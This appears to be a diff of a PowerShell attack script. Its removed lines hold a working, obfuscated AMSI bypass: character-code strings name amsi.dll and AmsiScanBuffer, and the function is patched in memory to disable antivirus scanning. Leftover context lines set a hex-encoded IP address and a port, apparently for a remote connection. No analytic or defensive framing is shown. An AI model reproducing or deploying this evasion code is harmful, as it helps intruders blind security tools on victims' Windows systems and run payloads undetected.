@@ -1,31 +1,3 @@
-$ttefy = @"
-using System;
-using System.Runtime.InteropServices;
-public class ttefy {
-    [DllImport("kernel32")]
-    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
-    [DllImport("kernel32")]
-    public static extern IntPtr LoadLibrary(string name);
-    [DllImport("kernel32")]
-    public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr ltiemh, uint flNewProtect, out uint lpflOldProtect);
-}
-"@
-
-Add-Type $ttefy
-
-$ieknmlv = [ttefy]::LoadLibrary("$([CHar]([ByTe]0x61)+[cHar]([bYte]0x6d)+[chaR]([bYTE]0x73)+[ChAr]([BytE]0x69)+[ChAR](46+18-18)+[ChaR]([BYte]0x64)+[chAR]([bYTE]0x6c)+[cHar]([bytE]0x6c))")
-$lowtcp = [ttefy]::GetProcAddress($ieknmlv, "$([CHAR]([BYTE]0x41)+[CHar](109)+[ChAr]([bYte]0x73)+[CHar]([bYtE]0x69)+[cHar]([BytE]0x53)+[Char]([BYte]0x63)+[chAr](97+70-70)+[ChaR]([BYtE]0x6e)+[cHAr]([BYte]0x42)+[ChAR](117)+[CHAr]([BYTe]0x66)+[ChAr]([byTe]0x66)+[cHar]([BytE]0x65)+[cHAr]([bYte]0x72))")
-$p = 0
-[ttefy]::VirtualProtect($lowtcp, [uint32]5, 0x40, [ref]$p)
-$koah = "0xB8"
-$yxdv = "0x57"
-$gfxu = "0x00"
-$mhlt = "0x07"
-$dawv = "0x80"
-$lpzq = "0xC3"
-$zkzri = [Byte[]] ($koah,$yxdv,$gfxu,$mhlt,+$dawv,+$lpzq)
-[System.Runtime.InteropServices.Marshal]::Copy($zkzri, 0, $lowtcp, 6)
-
 $IP = "0x40E3A151"
 $PORT = 5228
 
